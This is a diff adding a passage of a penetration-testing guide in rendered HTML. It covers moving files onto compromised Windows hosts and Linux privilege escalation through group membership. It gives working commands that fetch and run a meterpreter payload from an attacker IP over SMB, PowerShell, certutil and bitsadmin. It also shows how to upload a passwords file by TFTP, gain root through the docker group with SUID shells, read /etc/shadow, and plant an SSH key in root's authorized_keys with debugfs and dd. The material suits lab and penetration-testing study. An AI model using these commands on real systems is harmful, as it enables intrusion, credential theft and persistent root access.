+              <span class="mi">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>        <span class="mi">101</span><span class="p">,</span><span class="mi">696</span> <span class="nb">bytes</span>
+              <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">15</span><span class="p">,</span><span class="mi">207</span><span class="p">,</span><span class="mi">469</span><span class="p">,</span><span class="mi">056</span> <span class="nb">bytes</span> <span class="n">free</span>
+</pre></div>
+</div>
+<p>We can directly copy the file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">bitvijays</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">copy</span> \\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>\<span class="n">ps</span><span class="o">.</span><span class="n">exe</span> <span class="o">.</span>
+       <span class="mi">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>or directly execute it without copying</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>\\<span class="mf">10.10.14.16</span>\<span class="n">SHELLS</span>\<span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
+
+<span class="n">ps</span><span class="o">.</span><span class="n">exe</span> <span class="n">can</span> <span class="n">be</span> <span class="n">your</span> <span class="n">meterpreter</span> <span class="n">exe</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="http">
+<h3>HTTP<a class="headerlink" href="#http" title="Link to this heading"></a></h3>
+<section id="setting-up-the-server">
+<h4>Setting up the Server<a class="headerlink" href="#setting-up-the-server" title="Link to this heading"></a></h4>
+<p>We can use python-SimpleHTTPServer to set up a HTTP Web Server</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span>
+</pre></div>
+</div>
+</section>
+<section id="accessing-the-server-windows">
+<h4>Accessing the Server - Windows<a class="headerlink" href="#accessing-the-server-windows" title="Link to this heading"></a></h4>
+<p><strong>Windows Command Prompt</strong></p>
+<p>We can use powershell to download a file from a command prompt</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.10.10:8000/ps.exe&#39;,&#39;C:\Users</span><span class="se">\b</span><span class="s2">itvijays\Desktop\ps.exe&#39;)&quot;</span>
+</pre></div>
+</div>
+<p><strong>CertUtil</strong></p>
+<p>CertUtil command can be abused to download a file from internet.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">certutil</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="s2">&quot;https://download.sysinternals.com/files/PSTools.zip&quot;</span> <span class="n">pstools</span><span class="o">.</span><span class="n">zip</span>
+</pre></div>
+</div>
+<p><strong>Bitsadmin</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">bitsadmin</span> <span class="o">/</span><span class="n">transfer</span> <span class="n">myDownloadJob</span> <span class="o">/</span><span class="n">download</span> <span class="o">/</span><span class="n">priority</span> <span class="n">normal</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.10</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">ps</span><span class="o">.</span><span class="n">exe</span> <span class="n">c</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">bitvijays</span>\<span class="n">Desktop</span>\<span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="ftp">
+<h3>FTP<a class="headerlink" href="#ftp" title="Link to this heading"></a></h3>
+<p>We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>While downloading files from ftp, remember to switch to binary mode, otherwise the file could be corrupted.</p>
+</div>
+<section id="id2">
+<h4>Setting up the Server<a class="headerlink" href="#id2" title="Link to this heading"></a></h4>
+<p>We can either use Python-pyftpdlib or Metasploit to create a FTP Server</p>
+<p><strong>Python-pyftpdlib</strong></p>
+<p>Install using apt</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">python</span><span class="o">-</span><span class="n">pyftpdlib</span>
+</pre></div>
+</div>
+<p>Now from the directory we want to serve, just run the Python module. It runs on port 2121 by default (can be changed using -p parameter) and accepts anonymous authentication. To listen on the standard port:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>/home/bitvijays/SHELLS$ python -m pyftpdlib -p 21
+
+Usage: python -m pyftpdlib [options]
+
+Start a stand alone anonymous FTP server.
+
+Options:
+ -h, --help : show this help message and exit
+ -i ADDRESS, --interface=ADDRESS : specify the interface to run on (default all interfaces)
+ -p PORT, --port=PORT : specify port number to run on (default 2121)
+ -w, --write :  grants write access for logged in user (default read-only)
+ -d FOLDER, --directory=FOLDER : specify the directory to share (default current directory)
+ -n ADDRESS, --nat-address=ADDRESS : the NAT address to use for passive connections
+ -r FROM-TO, --range=FROM-TO : the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
+ -D, --debug : enable DEBUG logging evel
+ -v, --version : print pyftpdlib version and exit
+ -V, --verbose : activate a more verbose logging
+ -u USERNAME, --username=USERNAME : specify username to login with (anonymous login will be disabled and password required if supplied)
+ -P PASSWORD, --password=PASSWORD : specify a password to login with (username required to be useful)
+</pre></div>
+</div>
+<p><strong>Metasploit</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Name</span><span class="p">:</span> <span class="n">FTP</span> <span class="n">File</span> <span class="n">Server</span>
+<span class="n">Module</span><span class="p">:</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">ftp</span>
+<span class="n">License</span><span class="p">:</span> <span class="n">Metasploit</span> <span class="n">Framework</span> <span class="n">License</span> <span class="p">(</span><span class="n">BSD</span><span class="p">)</span>
+<span class="n">Rank</span><span class="p">:</span> <span class="n">Normal</span>
+
+<span class="n">Provided</span> <span class="n">by</span><span class="p">:</span>
+<span class="n">hdm</span> <span class="o">&lt;</span><span class="n">x</span><span class="nd">@hdm</span><span class="o">.</span><span class="n">io</span><span class="o">&gt;</span>
+
+<span class="n">Available</span> <span class="n">actions</span><span class="p">:</span>
+<span class="n">Name</span>     <span class="n">Description</span>
+<span class="o">----</span>     <span class="o">-----------</span>
+<span class="n">Service</span>
+
+<span class="n">Basic</span> <span class="n">options</span><span class="p">:</span>
+<span class="n">Name</span>      <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+<span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+<span class="n">FTPPASS</span>                    <span class="n">no</span>        <span class="n">Configure</span> <span class="n">a</span> <span class="n">specific</span> <span class="n">password</span> <span class="n">that</span> <span class="n">should</span> <span class="n">be</span> <span class="n">allowed</span> <span class="n">access</span>
+<span class="n">FTPROOT</span>   <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ftproot</span>     <span class="n">yes</span>       <span class="n">The</span> <span class="n">FTP</span> <span class="n">root</span> <span class="n">directory</span> <span class="n">to</span> <span class="n">serve</span> <span class="n">files</span> <span class="kn">from</span>
+<span class="nn">FTPUSER</span>                    <span class="n">no</span>        <span class="n">Configure</span> <span class="n">a</span> <span class="n">specific</span> <span class="n">username</span> <span class="n">that</span> <span class="n">should</span> <span class="n">be</span> <span class="n">allowed</span> <span class="n">access</span>
+<span class="n">PASVPORT</span>  <span class="mi">0</span>                <span class="n">no</span>        <span class="n">The</span> <span class="n">local</span> <span class="n">PASV</span> <span class="n">data</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="p">(</span><span class="mi">0</span> <span class="ow">is</span> <span class="n">random</span><span class="p">)</span>
+<span class="n">SRVHOST</span>   <span class="mf">0.0.0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span> <span class="n">This</span> <span class="n">must</span> <span class="n">be</span> <span class="n">an</span> <span class="n">address</span> <span class="n">on</span> <span class="n">the</span> <span class="n">local</span> <span class="n">machine</span> <span class="ow">or</span> <span class="mf">0.0.0.0</span>
+<span class="n">SRVPORT</span>   <span class="mi">21</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+<span class="n">SSL</span>       <span class="n">false</span>            <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span> <span class="k">for</span> <span class="n">incoming</span> <span class="n">connections</span>
+<span class="n">SSLCert</span>                    <span class="n">no</span>        <span class="n">Path</span> <span class="n">to</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">SSL</span> <span class="n">certificate</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="n">randomly</span> <span class="n">generated</span><span class="p">)</span>
+
+<span class="n">Description</span><span class="p">:</span>
+<span class="n">This</span> <span class="n">module</span> <span class="n">provides</span> <span class="n">a</span> <span class="n">FTP</span> <span class="n">service</span>
+</pre></div>
+</div>
+</section>
+<section id="access-using-ftp">
+<h4>Access using FTP<a class="headerlink" href="#access-using-ftp" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ftp</span> <span class="mf">10.10.10.10</span>
+<span class="n">Connected</span> <span class="n">to</span> <span class="mf">10.10.10.10</span><span class="o">.</span>
+<span class="mi">220</span> <span class="n">FTP</span> <span class="n">Server</span> <span class="n">Ready</span>
+<span class="n">Name</span> <span class="p">(</span><span class="n">localhost</span><span class="p">:</span><span class="n">root</span><span class="p">):</span> <span class="n">anonymous</span>
+<span class="mi">331</span> <span class="n">User</span> <span class="n">name</span> <span class="n">okay</span><span class="p">,</span> <span class="n">need</span> <span class="n">password</span><span class="o">...</span>
+<span class="n">Password</span><span class="p">:</span>
+<span class="mi">230</span> <span class="n">Login</span> <span class="n">OK</span>
+<span class="n">Remote</span> <span class="n">system</span> <span class="nb">type</span> <span class="ow">is</span> <span class="n">UNIX</span><span class="o">.</span>
+<span class="n">Using</span> <span class="n">binary</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">transfer</span> <span class="n">files</span><span class="o">.</span>
+
+<span class="n">ftp</span><span class="o">&gt;</span> <span class="n">ls</span>
+<span class="mi">200</span> <span class="n">PORT</span> <span class="n">command</span> <span class="n">successful</span><span class="o">.</span>
+<span class="mi">150</span> <span class="n">Opening</span> <span class="n">ASCII</span> <span class="n">mode</span> <span class="n">data</span> <span class="n">connection</span> <span class="k">for</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ls</span>
+<span class="n">total</span> <span class="mi">160</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="mi">0</span>      <span class="mi">0</span>       <span class="mi">512</span> <span class="n">Jan</span>  <span class="mi">1</span>  <span class="mi">2000</span> <span class="o">..</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="mi">0</span>      <span class="mi">0</span>       <span class="mi">512</span> <span class="n">Jan</span>  <span class="mi">1</span>  <span class="mi">2000</span> <span class="o">.</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="mi">0</span>      <span class="mi">0</span>       <span class="mi">166</span> <span class="n">Jan</span>  <span class="mi">1</span>  <span class="mi">2000</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
+<span class="mi">226</span> <span class="n">Transfer</span> <span class="n">complete</span><span class="o">.</span>
+
+<span class="n">ftp</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
+<span class="n">local</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span> <span class="n">remote</span><span class="p">:</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
+<span class="mi">200</span> <span class="n">PORT</span> <span class="n">command</span> <span class="n">successful</span><span class="o">.</span>
+<span class="mi">150</span> <span class="n">Opening</span> <span class="n">BINARY</span> <span class="n">mode</span> <span class="n">data</span> <span class="n">connection</span> <span class="k">for</span> <span class="n">secret</span><span class="o">.</span><span class="n">zip</span>
+<span class="mi">226</span> <span class="n">Transfer</span> <span class="n">complete</span><span class="o">.</span>
+<span class="mi">166</span> <span class="nb">bytes</span> <span class="n">received</span> <span class="ow">in</span> <span class="mf">0.00</span> <span class="n">secs</span> <span class="p">(</span><span class="mf">138.4367</span> <span class="n">kB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
+<span class="n">ftp</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>FTP can also accepts a series of commands stored in a text file</p>
+<p>Contents of a text file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">open</span> <span class="mf">10.10.10.10</span>
+<span class="n">anonymous</span>
+<span class="n">anonymous</span>
+<span class="n">binary</span>
+<span class="n">get</span> <span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
+<span class="n">bye</span>
+</pre></div>
+</div>
+<p>Passing parameter to ftp</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ftp</span> <span class="o">-</span><span class="n">s</span><span class="p">:</span><span class="n">filename</span><span class="o">-</span><span class="n">containing</span><span class="o">-</span><span class="n">commands</span>
+</pre></div>
+</div>
+<p>The file can be created by using echo</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;open 10.10.10.10&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">commands</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">echo</span> <span class="s2">&quot;anonymous&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">commands</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="tftp">
+<h3>TFTP<a class="headerlink" href="#tftp" title="Link to this heading"></a></h3>
+<p>We can also utilize TFTP to download or upload files</p>
+<section id="id3">
+<h4>Setting up the Server<a class="headerlink" href="#id3" title="Link to this heading"></a></h4>
+<p>Metasploit module</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span>
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
+
+      <span class="n">Name</span><span class="p">:</span> <span class="n">TFTP</span> <span class="n">File</span> <span class="n">Server</span>
+    <span class="n">Module</span><span class="p">:</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span>
+   <span class="n">License</span><span class="p">:</span> <span class="n">Metasploit</span> <span class="n">Framework</span> <span class="n">License</span> <span class="p">(</span><span class="n">BSD</span><span class="p">)</span>
+      <span class="n">Rank</span><span class="p">:</span> <span class="n">Normal</span>
+
+<span class="n">Provided</span> <span class="n">by</span><span class="p">:</span>
+ <span class="n">jduck</span> <span class="o">&lt;</span><span class="n">jduck</span><span class="nd">@metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
+ <span class="n">todb</span> <span class="o">&lt;</span><span class="n">todb</span><span class="nd">@metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
+
+<span class="n">Available</span> <span class="n">actions</span><span class="p">:</span>
+ <span class="n">Name</span>     <span class="n">Description</span>
+ <span class="o">----</span>     <span class="o">-----------</span>
+ <span class="n">Service</span>
+
+<span class="n">Basic</span> <span class="n">options</span><span class="p">:</span>
+ <span class="n">Name</span>        <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+ <span class="o">----</span>        <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+ <span class="n">OUTPUTPATH</span>  <span class="o">/</span><span class="n">tmp</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">directory</span> <span class="ow">in</span> <span class="n">which</span> <span class="n">uploaded</span> <span class="n">files</span> <span class="n">will</span> <span class="n">be</span> <span class="n">written</span><span class="o">.</span>
+ <span class="n">SRVHOST</span>     <span class="mf">0.0.0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+ <span class="n">SRVPORT</span>     <span class="mi">69</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+ <span class="n">TFTPROOT</span>    <span class="o">/</span><span class="n">tmp</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">TFTP</span> <span class="n">root</span> <span class="n">directory</span> <span class="n">to</span> <span class="n">serve</span> <span class="n">files</span> <span class="kn">from</span>
+
+<span class="nn">Description</span><span class="p">:</span>
+ <span class="n">This</span> <span class="n">module</span> <span class="n">provides</span> <span class="n">a</span> <span class="n">TFTP</span> <span class="n">service</span>
+
+<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">server</span><span class="o">/</span><span class="n">tftp</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">running</span> <span class="k">as</span> <span class="n">background</span> <span class="n">job</span> <span class="mf">0.</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">TFTP</span> <span class="n">server</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mf">69.</span><span class="o">..</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Files</span> <span class="n">will</span> <span class="n">be</span> <span class="n">served</span> <span class="kn">from</span> <span class="o">/</span><span class="n">tmp</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploaded</span> <span class="n">files</span> <span class="n">will</span> <span class="n">be</span> <span class="n">saved</span> <span class="ow">in</span> <span class="o">/</span><span class="n">tmp</span>
+</pre></div>
+</div>
+</section>
+<section id="accessing-the-share">
+<h4>Accessing the Share<a class="headerlink" href="#accessing-the-share" title="Link to this heading"></a></h4>
+<p>Downloading a file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tftp</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.10.10</span> <span class="n">GET</span> <span class="n">ps</span><span class="o">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>Uploading a file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tftp</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.10.10</span> <span class="n">PUT</span> <span class="n">Passwords</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+</section>
+<section id="installing-tftp-windows">
+<h4>Installing tftp - Windows<a class="headerlink" href="#installing-tftp-windows" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pkgmgr</span> <span class="o">/</span><span class="n">iu</span><span class="p">:</span><span class="s2">&quot;TFTP&quot;</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+<section id="a4-linux-group-membership-issues">
+<span id="id4"></span><h2>A4: Linux Group Membership Issues<a class="headerlink" href="#a4-linux-group-membership-issues" title="Link to this heading"></a></h2>
+<p>Let’s examine in what groups we are members. Recommended read about groups: <a class="reference external" href="https://wiki.archlinux.org/index.php/users_and_groups">Users and Groups</a> and <a class="reference external" href="https://wiki.debian.org/SystemGroups">System Groups</a></p>
+<section id="docker-group">
+<h3>Docker Group<a class="headerlink" href="#docker-group" title="Link to this heading"></a></h3>
+<p>Any user who is part of the docker group should also be considered root. Read <a class="reference external" href="http://reventlov.com/advisories/using-the-docker-command-to-root-the-host">Using the docker command to root the host</a> Older version of docker were vulnerable to Docker breakout. More details at <a class="reference external" href="https://github.com/gabrtv/shocker">Shocker / Docker Breakout PoC</a></p>
+<p>If you are the docker user and want to get root.</p>
+<section id="create-a-dockerfile">
+<h4>Create a Dockerfile<a class="headerlink" href="#create-a-dockerfile" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>mkdir docker-test
+cd docker-test
+
+cat &gt; Dockerfile
+FROM debian:wheezy
+ENV WORKDIR /stuff
+RUN mkdir -p $WORKDIR
+VOLUME [ $WORKDIR ]
+WORKDIR $WORKDIR
+</pre></div>
+</div>
+</section>
+<section id="build-the-docker">
+<h4>Build the Docker<a class="headerlink" href="#build-the-docker" title="Link to this heading"></a></h4>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">build</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">.</span>
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>If there are already docker images present on the host machine, we can utilize those also instead of making a new one. If there are none, we can copy a image to the vulnerable machine.</p>
+</div>
+<p><strong>Copy docker images from one host to another without via repository?</strong></p>
+<p>Save the docker image as a tar file:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">save</span> <span class="o">-</span><span class="n">o</span> <span class="o">&lt;</span><span class="n">path</span> <span class="k">for</span> <span class="n">generated</span> <span class="n">tar</span> <span class="n">file</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">image</span> <span class="n">name</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>Then copy the image to a new system with regular file transfer tools such as cp or scp. After that, load the image into docker:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">load</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span><span class="n">path</span> <span class="n">to</span> <span class="n">image</span> <span class="n">tar</span> <span class="n">file</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</section>
+<section id="become-root">
+<h4>Become root?<a class="headerlink" href="#become-root" title="Link to this heading"></a></h4>
+<ul class="simple">
+<li><p>Copy binaries from the container into the host and give them suid permissions:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c &#39;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#39;
+
+./sh
+whoami
+# root
+</pre></div>
+</div>
+<p>If the sh is not working, create a suid.c, compile it, suid it and run.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="n">etc</span><span class="p">:</span><span class="o">/</span><span class="n">stuff</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;cat shadow&#39;</span>
+<span class="c1"># root:!:16364:0:99999:7:::</span>
+<span class="c1"># daemon:*:16176:0:99999:7:::</span>
+<span class="c1"># bin:*:16176:0:99999:7:::</span>
+<span class="c1"># ...</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Bind the host’s / and overwrite system commands with rogue programs:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">stuff</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;cp /stuff/rogue-program /stuff/bin/cat&#39;</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Privileged copy of bash for later access?</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">v</span> <span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">stuff</span> <span class="o">-</span><span class="n">t</span> <span class="n">my</span><span class="o">-</span><span class="n">docker</span><span class="o">-</span><span class="n">image</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;cp /stuff/bin/bash /stuff/bin/root-shell-ftw &amp;&amp; chmod a+s /stuff/bin/root-shell-ftw&#39;</span>
+<span class="n">root</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="n">ftw</span>  <span class="o">-</span><span class="n">p</span>
+<span class="n">root</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="n">ftw</span><span class="o">-</span><span class="mf">4.3</span><span class="c1">#</span>
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+</section>
+<section id="video">
+<h3>Video<a class="headerlink" href="#video" title="Link to this heading"></a></h3>
+<p>If the user is a part of the video group, he possibly might have access to the frame buffer (/dev/fb0) (which provides an abstraction for the video hardware), video capture devices, 2D/3D hardware acceleration. More details can be found at <a class="reference external" href="https://en.wikipedia.org/wiki/Linux_framebuffer">Linux Framebuffer</a> and <a class="reference external" href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">Kernel Framebuffer</a></p>
+<p>If, we have access to the framebuffer device /dev/fb0. We can use a tool like <a class="reference external" href="https://github.com/AndrewFromMelbourne/fb2png">fb2png</a> to convert it to a png picture or we can cat it and get a file:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">fb0</span> <span class="o">&gt;</span> <span class="n">screenshot</span><span class="o">.</span><span class="n">raw</span>
+
+<span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="n">screenshot</span><span class="o">.</span><span class="n">raw</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4163040</span> <span class="n">May</span> <span class="mi">18</span> <span class="mi">03</span><span class="p">:</span><span class="mi">52</span> <span class="n">screenshot</span><span class="o">.</span><span class="n">raw</span>
+</pre></div>
+</div>
+<p>To find the screen resolution, we can read virtual size</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">class</span><span class="o">/</span><span class="n">graphics</span><span class="o">/</span><span class="n">fb0</span><span class="o">/</span><span class="n">virtual_size</span>
+<span class="mi">1176</span><span class="p">,</span><span class="mi">885</span>
+</pre></div>
+</div>
+<p>We can then open the screenshot as a raw file (Select File Type: Raw Image Data) in Gimp, enter the width and height as well of the color arrangement, RGB, RGBA etc.</p>
+</section>
+<section id="disk">
+<h3>Disk<a class="headerlink" href="#disk" title="Link to this heading"></a></h3>
+<p>Debian’s wiki says about the “disk” group: Raw access to disks. Mostly equivalent to root access. The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.</p>
+<p>We can use debugfs command to read everything and dd command to write anywhere.</p>
+<p>Read /root/.ssh/authorized_keys using debugfs:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs -w /dev/sda1 -R &quot;cat /root/.ssh/authorized_keys&quot;
+debugfs 1.42.13 (17-May-2015)
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+</pre></div>
+</div>
+<p>Let’s find the block where the “/root/.ssh/authorized_keys” file resides:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ debugfs /dev/sda1 -R &quot;blocks /root/.ssh/authorized_keys&quot;
+debugfs 1.42.13 (17-May-2015)
+1608806
+</pre></div>
+</div>
+<p>Let’s use dd to write our own public key inside /root/.ssh/authorized_keys. This command will write over (i.e. it will replace) the old data:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>user@hostname:/tmp$ dd if=/tmp/id_rsa.pub of=/dev/sda1 seek=1608806 bs=4096 count=1
+0+1 records in
+0+1 records out
+394 bytes copied, 0.00239741 s, 164 kB/s
+</pre></div>
+</div>
